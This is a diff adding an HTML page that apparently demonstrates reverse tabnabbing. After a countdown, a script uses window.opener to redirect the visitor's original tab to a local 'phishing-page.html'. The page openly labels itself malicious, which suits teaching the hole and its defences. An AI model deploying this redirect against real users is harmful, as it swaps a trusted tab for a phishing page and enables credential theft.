@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <title>Bad offsite page</title>
+  <style>
+    body {
+      font-family: sans-serif, Arial, Helvetica, sans-serif;
+    }
+  </style>
+</head>
+
+<body>
+  <h1>Welcome to a malicious offsite page!</h1>
+  <h2>Take a look at the title of your old tab as the countdown expires.</h2>
+  <p id="tn-message">Nabbing them tabs in <span id="countdown">10</span></p>
+  <script>
+    const beMalicious = () => window.opener.location = "phishing-page.html";
+    const countdown = document.getElementById('countdown');
+    let count = 10;
+    let interval = setInterval(() => count
+      ? (countdown.innerText = --count)
+      : (clearInterval(interval) || beMalicious()), 1000);
+  </script>
+</body>
+
+</html>
